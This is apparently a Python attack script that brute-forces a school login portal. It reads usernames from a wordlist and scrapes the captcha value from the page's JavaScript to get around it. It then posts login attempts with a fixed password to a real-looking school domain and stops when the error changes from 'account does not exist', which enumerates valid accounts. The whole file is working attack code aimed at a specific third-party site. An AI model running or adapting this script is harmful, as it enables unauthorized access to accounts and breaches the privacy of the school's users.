import re
import requests

#Target
url1 = "https://Fake1"  #Grep Valid Code
url2 = "https://Fake2"  #Login Attemt !

# Otions 
surfix = "@mail.hcsh.tp.edu.tw"   # ajdusting paylod


# Reading worlist and save it as a list 
def readWordlistToList(filePath):

    list = []
    try:
        with open(filePath, "r") as wordlist:

            for line in wordlist:
                list.append(line.rstrip()) # Remove "/n"    

            #print("List:", list)
            wordlist.close()
        
        return list
    except FileNotFoundError:
        print("File not found:", filePath)
    except Exception as e:
        print("Error", e)


# print(readWordlistToList('./wordlist.txt'))


usernames = readWordlistToList('./wordlist1.txt')


#Guess!!

count = 0
# Staring Brute Force Attack !!
for username in usernames:
    
    session = requests.Session()
    response = session.get(url1)

    # Grep Valid Code 
    pattern = r"ctx\.fillText\('([^']*)', 75, 35\)"
    match = re.search(pattern, response.text)

    if match:
        print("Sucess: match1:", match.group(1))
    else:
        print("Fail !!")

    # print(response.text)

    
    payloads = {
        "task":"login",
        "ln_id":username+surfix,
        "passwd":"password",
        "vcode":match.group(1),
        "action":'%B5n%A1%40%A4J'
    }
    response2 = session.post('https://qe.tchcvs.tc.edu.tw/login.asp',data=payloads)

    #decoding(chinese Decode!)
    decodeingResponse = response2.content.decode("big5")
    
    pattern2 = r'<p class="msg err">([^<]*)</p>'
    match2 = re.search(pattern2, decodeingResponse)

    if match2:
        print("Match2 Error Message", match2.group(1))
        ErrorResponse = match2.group(1)
    else:
        print("fail")

    session.close()

    if ErrorResponse != "登入失敗;帳號不存在。": #check whether login or not 
        break

    count = count + 1
    print("Attemt AccountName",username+surfix)
    print("request Count",count)